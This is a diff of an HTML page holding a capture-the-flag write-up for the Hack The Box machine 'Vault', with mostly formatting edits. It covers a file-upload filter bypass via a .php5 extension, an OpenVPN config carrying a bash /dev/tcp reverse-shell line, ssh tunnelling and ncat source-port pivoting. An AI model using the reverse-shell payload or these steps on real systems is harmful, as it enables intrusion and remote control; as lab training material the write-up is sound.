@@ -87,20 +87,20 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an <code class="highlighter-rouge">openvpn</code> config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.109</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">vault.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/vault/0.png" alt=""></p>
+<br><img src="/images/hackthebox/vault/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with nmap to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC vault.htb</code>
-<img src="/images/hackthebox/vault/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC vault.htb</code>
+<br><img src="/images/hackthebox/vault/1.png" alt=""><br>
 <br> Only two ports are open : 80 running http and 22 running ssh. As always we will check http.
 <br></p>
 <hr>
 
 <h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
 <p><br> The main page is just displaying this message :
-<img src="/images/hackthebox/vault/2.png" alt=""></p>
+<br><img src="/images/hackthebox/vault/2.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the Slowdaddy web interface
 
 We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
@@ -109,7 +109,7 @@ We are proud to announce our first client: Sparklays (Sparklays.com still under 
 
 </code></pre></div></div>
 <p><br> I ran <code class="highlighter-rouge">gobuster</code> but didn’t get anything , so I looked at the message again and noticed this line : <code class="highlighter-rouge">We are proud to announce our first client: Sparklays (Sparklays.com still under construction)</code>. So I went to <code class="highlighter-rouge">/sparklays</code> and got a <code class="highlighter-rouge">403</code> response.
-<img src="/images/hackthebox/vault/3.png" alt="">
+<br><img src="/images/hackthebox/vault/3.png" alt=""><br>
 <br> So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
@@ -131,12 +131,12 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">/admin.php</code> sounds interesting. But in fact it’s useless.
 <code class="highlighter-rouge">/admin.php</code> :
-<img src="/images/hackthebox/vault/4.png" alt="">
+<br><img src="/images/hackthebox/vault/4.png" alt=""><br>
 <br> It asks for authentication , I tried <code class="highlighter-rouge">test:test</code> and got nothing. It didn’t print anything :
-<img src="/images/hackthebox/vault/5.png" alt="">
+<br><img src="/images/hackthebox/vault/5.png" alt=""><br>
 <br> And I also noticed that it’s sending the login data through <code class="highlighter-rouge">GET</code> parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time. 
 <code class="highlighter-rouge">/design</code> :
-<img src="/images/hackthebox/vault/6.png" alt="">
+<br><img src="/images/hackthebox/vault/6.png" alt=""><br>
 <br> Design gave us a <code class="highlighter-rouge">403</code> response , I ran gobuster one more time and got these results :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
@@ -156,69 +156,63 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 /uploads (Status: 301)
 </code></pre></div></div>
 <p><br> So I checked <code class="highlighter-rouge">/uploads</code> : 
-<img src="/images/hackthebox/vault/7.png" alt="">
+<br><img src="/images/hackthebox/vault/7.png" alt=""><br>
 <br> And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions <code class="highlighter-rouge">php</code> and <code class="highlighter-rouge">html</code> and got a new result : <code class="highlighter-rouge">design.html</code>
 <code class="highlighter-rouge">/design.html</code> :
-<img src="/images/hackthebox/vault/8.png" alt="">
+<br><img src="/images/hackthebox/vault/8.png" alt=""><br>
 <br> There’s a link titled <code class="highlighter-rouge">Change Logo</code> which takes us to this upload page :
-<img src="/images/hackthebox/vault/9.png" alt=""></p>
+<br><img src="/images/hackthebox/vault/9.png" alt=""><br></p>
 <hr>
 
 <h2 id="bypassing-restricted-file-upload">Bypassing Restricted File Upload</h2>
 <p><br> I created a small <code class="highlighter-rouge">php</code> script to get a reverse shell :
-<img src="/images/hackthebox/vault/10.png" alt="">
+<br><img src="/images/hackthebox/vault/10.png" alt=""><br>
 <br> And named it <code class="highlighter-rouge">shell.php</code>.
 <br> Tried to upload and as expected , it told us that this file type is not allowed :
-<img src="/images/hackthebox/vault/11.png" alt="">
+<br><img src="/images/hackthebox/vault/11.png" alt=""><br>
 <br> We need to know what are the allowed file types , We will use Zap’s fuzzer and a <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt" target="_blank" rel="noopener noreferrer">file extenstions wordlist</a> I got from seclists.
 <br> Intercept the request –&gt; right click –&gt; attack –&gt; Fuzzer
-<img src="/images/hackthebox/vault/12.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/13.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/14.png" alt="">
+<br><img src="/images/hackthebox/vault/12.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/13.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/14.png" alt=""><br>
 <br> By filtering the response body size we will notice that all the responses are <code class="highlighter-rouge">519</code> bytes except the response of <code class="highlighter-rouge">.php5</code> which is <code class="highlighter-rouge">526</code> bytes. So it allows files with extension <code class="highlighter-rouge">.php5</code> to be uploaded.
-<img src="/images/hackthebox/vault/15.png" alt="">
+<br><img src="/images/hackthebox/vault/15.png" alt=""><br>
 <br> Since the request has already been sent then the php shell is on the server now , Let’s excute it :
-<img src="/images/hackthebox/vault/16.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/17.png" alt="">
+<br><img src="/images/hackthebox/vault/16.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/17.png" alt=""><br>
 <br> There are two users on the box <code class="highlighter-rouge">alex</code> and <code class="highlighter-rouge">dave</code> , user flag is not on the box. On the desktop of <code class="highlighter-rouge">dave</code> there is a file called <code class="highlighter-rouge">ssh</code> which has ssh credentials :
-<img src="/images/hackthebox/vault/18.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/19.png" alt="">
-<br> Now we can get an ssh connection as <code class="highlighter-rouge">dave</code> instead of this reverse shell as <code class="highlighter-rouge">www-data</code> <code class="highlighter-rouge">dave : Dav3therav3123</code> :
-<img src="/images/hackthebox/vault/20.png" alt=""></p>
+<br><img src="/images/hackthebox/vault/18.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/19.png" alt=""><br>
+<br> Now we can get an ssh connection as <code class="highlighter-rouge">dave</code> instead of this reverse shell as <code class="highlighter-rouge">www-data</code> 
+<br><code class="highlighter-rouge">dave : Dav3therav3123</code> :
+<br><img src="/images/hackthebox/vault/20.png" alt=""><br></p>
 <hr>
 
 <h2 id="escaping-from-ubuntu-to-dns--openvpn-reverse-shell--getting-user">Escaping from <code class="highlighter-rouge">ubuntu</code> to <code class="highlighter-rouge">DNS</code> , <code class="highlighter-rouge">openvpn</code> reverse shell , Getting user</h2>
 <p><br> Let’s take a look at the rest of the files on dave’s desktop :
-<img src="/images/hackthebox/vault/21.png" alt="">
+<br><img src="/images/hackthebox/vault/21.png" alt=""><br>
 <br> No idea what to do with that key <code class="highlighter-rouge">itscominghome</code> so we will leave it for now. The other file is <code class="highlighter-rouge">Servers</code> :
-<img src="/images/hackthebox/vault/22.png" alt="">
+<br><img src="/images/hackthebox/vault/22.png" alt=""><br>
 <br> We have another ip now : <code class="highlighter-rouge">192.168.122.5</code> , We need to scan it but unfortunately <code class="highlighter-rouge">nmap</code> is not on the box :
-<img src="/images/hackthebox/vault/23.png" alt="">
-<br> Alternatively we will use <code class="highlighter-rouge">nc</code> to scan the first 100 ports like this : <code class="highlighter-rouge">nc -zv 192.168.122.5 1-100</code>
+<br><img src="/images/hackthebox/vault/23.png" alt=""><br>
+<br> Alternatively we will use <code class="highlighter-rouge">nc</code> to scan the first 100 ports like this : 
+<br><code class="highlighter-rouge">nc -zv 192.168.122.5 1-100</code>
 <br> Port 80 is open and running http :
-<img src="/images/hackthebox/vault/24.png" alt="">
+<br><img src="/images/hackthebox/vault/24.png" alt=""><br>
 <br> Port 22 is open and running ssh :
-<img src="/images/hackthebox/vault/25.png" alt="">
+<br><img src="/images/hackthebox/vault/25.png" alt=""><br>
 <br> We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :
-<code class="highlighter-rouge">ssh -L 1234:192.168.122.4:80 dave@vault.htb</code>
-<img src="/images/hackthebox/vault/26.png" alt="">
+<br><code class="highlighter-rouge">ssh -L 1234:192.168.122.4:80 dave@vault.htb</code>
+<br><img src="/images/hackthebox/vault/26.png" alt=""><br>
 <br> Now we can go to <code class="highlighter-rouge">http://localhost:1234</code> and access that http service :
-<img src="/images/hackthebox/vault/27.png" alt="">
+<br><img src="/images/hackthebox/vault/27.png" alt=""><br>
 <br> DNS configurator gives us a <code class="highlighter-rouge">404</code> response :
-<img src="/images/hackthebox/vault/28.png" alt="">
+<br><img src="/images/hackthebox/vault/28.png" alt=""><br>
 <br> Vpn configurator allows us to create an <code class="highlighter-rouge">ovpn</code> file and execute it :
-<img src="/images/hackthebox/vault/29.png" alt="">
+<br><img src="/images/hackthebox/vault/29.png" alt=""><br>
 <br> At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an <code class="highlighter-rouge">ovpn</code> file , and <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank" rel="noopener noreferrer">this article</a> really helped.
-<br> We are going to listen on the first host (<code class="highlighter-rouge">ubuntu</code>) and use the <code class="highlighter-rouge">ovpn</code> configurator to get a reverse shell on the second host (<code class="highlighter-rouge">DNS</code>) , We need to know the ip address of <code class="highlighter-rouge">ubuntu</code> on that subnet , <code class="highlighter-rouge">ifconfig</code> :
-<img src="/images/hackthebox/vault/30.png" alt="">
+<br> We are going to listen on the first host (<code class="highlighter-rouge">ubuntu</code>) and use the <code class="highlighter-rouge">ovpn</code> configurator to get a reverse shell on the second host (<code class="highlighter-rouge">DNS</code>) , We need to know the ip address of <code class="highlighter-rouge">ubuntu</code> on that subnet, <code class="highlighter-rouge">ifconfig</code> :
+<br><img src="/images/hackthebox/vault/30.png" alt=""><br>
 <br> ip : <code class="highlighter-rouge">192.168.122.1</code>
 <br> Reverse shell payload :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remote 192.168.122.1
@@ -227,30 +221,28 @@ nobind
 script-security 2 
 up "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/9898 0&gt;&amp;1'"
 </code></pre></div></div>
-<p><img src="/images/hackthebox/vault/31.png" alt="">
+<p><br><img src="/images/hackthebox/vault/31.png" alt=""><br>
 <br> I used <code class="highlighter-rouge">nobind</code> because as you can see there’s a note saying that <code class="highlighter-rouge">nobind</code> must be used. Let’s update the file and click on <code class="highlighter-rouge">Test VPN</code> then check our listener :
-<img src="/images/hackthebox/vault/32.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/33.png" alt="">
+<br><img src="/images/hackthebox/vault/32.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/33.png" alt=""><br>
 <br> And we owned user !
 <br></p>
 <hr>
 
 <h2 id="ssh-on-dns">SSH on DNS</h2>
 <p><br> In the <code class="highlighter-rouge">/home</code> directory of <code class="highlighter-rouge">dave</code> on <code class="highlighter-rouge">DNS</code> there’s a file called <code class="highlighter-rouge">ssh</code> which has ssh credentials :
-<img src="/images/hackthebox/vault/34.png" alt="">
+<br><img src="/images/hackthebox/vault/34.png" alt=""><br>
 <br> So we can close that reverse shell and get an ssh connection on <code class="highlighter-rouge">DNS</code> as <code class="highlighter-rouge">dave</code> <code class="highlighter-rouge">dave : dav3gerous567</code>:
-<img src="/images/hackthebox/vault/35.png" alt="">
+<br><img src="/images/hackthebox/vault/35.png" alt=""><br>
 <br> But we had <code class="highlighter-rouge">root</code> on <code class="highlighter-rouge">DNS</code> , now we are <code class="highlighter-rouge">dave</code>. We want to get root again. <code class="highlighter-rouge">sudo -l</code> tells us that <code class="highlighter-rouge">dave</code> can use sudo on any command :
-<img src="/images/hackthebox/vault/36.png" alt="">
+<br><img src="/images/hackthebox/vault/36.png" alt=""><br>
 <br> So we can easily get <code class="highlighter-rouge">root</code> again by <code class="highlighter-rouge">sudo su</code> :
-<img src="/images/hackthebox/vault/37.png" alt=""></p>
+<br><img src="/images/hackthebox/vault/37.png" alt=""><br></p>
 <hr>
 
 <h2 id="authlog-enumeration">Auth.log Enumeration</h2>
 <p><br> By looking at <code class="highlighter-rouge">Servers</code> file again , which was on <code class="highlighter-rouge">ubuntu</code>
-<img src="/images/hackthebox/vault/22.png" alt="">
+<br><img src="/images/hackthebox/vault/22.png" alt=""><br>
 <br> We notice that there’s a host called <code class="highlighter-rouge">The Vault</code> and its ip is not there , so probably we need to get to that host , but we need its ip first. 
 <br> After a lot of enumeration I looked into <code class="highlighter-rouge">auth.log</code> and noticed that on the 2nd of September at <code class="highlighter-rouge">15:10:20</code> and <code class="highlighter-rouge">15:10:34</code> these commands were executed :
 <br> Part of the log :</p>
@@ -264,16 +256,14 @@ Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root b
 dave(uid=0)
 Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
 </code></pre></div></div>
-<p><img src="/images/hackthebox/vault/38.png" alt="">
+<p><br><img src="/images/hackthebox/vault/38.png" alt=""><br>
 <br> Commands :
-<code class="highlighter-rouge">/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53</code>
-<br>
-<br>
-<code class="highlighter-rouge">/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53</code>
-<br> We have an ip (<code class="highlighter-rouge">192.168.5.2</code>) and we suspect that its the one we are looking for. I was using <code class="highlighter-rouge">less</code> to view the log so I searched for the ip to see if it was mentioned anywhere else <code class="highlighter-rouge">:?192.168.5.2</code> , And I found it here too :
-<img src="/images/hackthebox/vault/39.png" alt="">
+<br><code class="highlighter-rouge">/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53</code>
+<br><code class="highlighter-rouge">/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53</code>
+<br> We have an ip (<code class="highlighter-rouge">192.168.5.2</code>) and we suspect that its the one we are looking for. I was using <code class="highlighter-rouge">less</code> to view the log so I searched for the ip to see if it was mentioned anywhere else <code class="highlighter-rouge">:?192.168.5.2</code>, And I found it here too :
+<br><img src="/images/hackthebox/vault/39.png" alt=""><br>
 <br> Command :
-<code class="highlighter-rouge">/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444</code>
+<br><code class="highlighter-rouge">/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444</code>
 <br> On the same day at <code class="highlighter-rouge">15:07:51</code> That ip was scanned with <code class="highlighter-rouge">nmap</code> , and we notice <code class="highlighter-rouge">--source-port=4444</code> , what’s that ?
 <br></p>
 <hr>
@@ -281,39 +271,35 @@ Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
 <h2 id="source-port--escaping-from-dns-to-vault">Source Port , Escaping from <code class="highlighter-rouge">DNS</code> to <code class="highlighter-rouge">vault</code>
 </h2>
 <p><br> Let’s take that nmap command and run it again to see the results : 
-<img src="/images/hackthebox/vault/40.png" alt="">
+<br><img src="/images/hackthebox/vault/40.png" alt=""><br>
 <br> Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan :
-<code class="highlighter-rouge">nmap -Pn 192.168.5.2</code>
-<img src="/images/hackthebox/vault/41.png" alt="">
+<br><code class="highlighter-rouge">nmap -Pn 192.168.5.2</code>
+<br><img src="/images/hackthebox/vault/41.png" alt=""><br>
 <br> Port 53 and 4444 , both of them are closed. weird … where is port 987 ?
 <br> So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.
 <br> To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use <code class="highlighter-rouge">ncat</code> and make it listen on port 2222 , then the service running on that port will be another <code class="highlighter-rouge">ncat</code> connection from port 4444 to port 987 on <code class="highlighter-rouge">192.168.5.2</code> 
-<code class="highlighter-rouge">ncat -l 2222 --sh-exec "ncat -p 4444 192.168.5.2 987"</code>
-<img src="/images/hackthebox/vault/42.png" alt="">
+<br><code class="highlighter-rouge">ncat -l 2222 --sh-exec "ncat -p 4444 192.168.5.2 987"</code>
+<br><img src="/images/hackthebox/vault/42.png" alt=""><br>
 <br> We will get another ssh connection to <code class="highlighter-rouge">DNS</code> , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately <code class="highlighter-rouge">nmap</code> can’t tell us because our connection is not direct.
-<img src="/images/hackthebox/vault/43.png" alt="">
+<br><img src="/images/hackthebox/vault/43.png" alt=""><br>
 <br> So I guessed common services and it was <code class="highlighter-rouge">ssh</code> :
-<img src="/images/hackthebox/vault/44.png" alt="">
+<br><img src="/images/hackthebox/vault/44.png" alt=""><br>
 <br> I tried <code class="highlighter-rouge">dave</code> as the username and <code class="highlighter-rouge">dav3gerous567</code> as the password (same credentials for <code class="highlighter-rouge">DNS</code>) and it worked. 
 <br></p>
 <hr>
 
 <h2 id="decrypting-root-flag">Decrypting root flag</h2>
 <p><br> In the <code class="highlighter-rouge">/home</code> directory of <code class="highlighter-rouge">dave</code> on <code class="highlighter-rouge">vault</code> there’s a file called <code class="highlighter-rouge">root.txt.gpg</code> :
-<img src="/images/hackthebox/vault/45.png" alt="">
+<br><img src="/images/hackthebox/vault/45.png" alt=""><br>
 <br> Which is the root flag but gpg encrypted :
-<img src="/images/hackthebox/vault/46.png" alt="">
+<br><img src="/images/hackthebox/vault/46.png" alt=""><br>
 <br> We need a key to decrypt the flag , remember the key we saw earlier on <code class="highlighter-rouge">ubuntu</code> ? We will copy the file to <code class="highlighter-rouge">ubuntu</code> to decrypt it , Easiest way to do it is to <code class="highlighter-rouge">base64</code> encode it then copy the <code class="highlighter-rouge">base64</code> data and decode it on <code class="highlighter-rouge">ubuntu</code>. But <code class="highlighter-rouge">base64</code> was not installed on <code class="highlighter-rouge">vault</code> so I used <code class="highlighter-rouge">base32</code> instead :
-<img src="/images/hackthebox/vault/47.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/48.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/vault/49.png" alt="">
+<br><img src="/images/hackthebox/vault/47.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/48.png" alt=""><br>
+<br><img src="/images/hackthebox/vault/49.png" alt=""><br>
 <br> Now let’s decrypt it with the key : <code class="highlighter-rouge">itscominghome</code> :
-<code class="highlighter-rouge">gpg -d root.txt.gpg</code>
-<img src="/images/hackthebox/vault/50.png" alt="">
+<br><code class="highlighter-rouge">gpg -d root.txt.gpg</code>
+<br><img src="/images/hackthebox/vault/50.png" alt=""><br>
 <br> And we owned root !
 <br>
 <br>
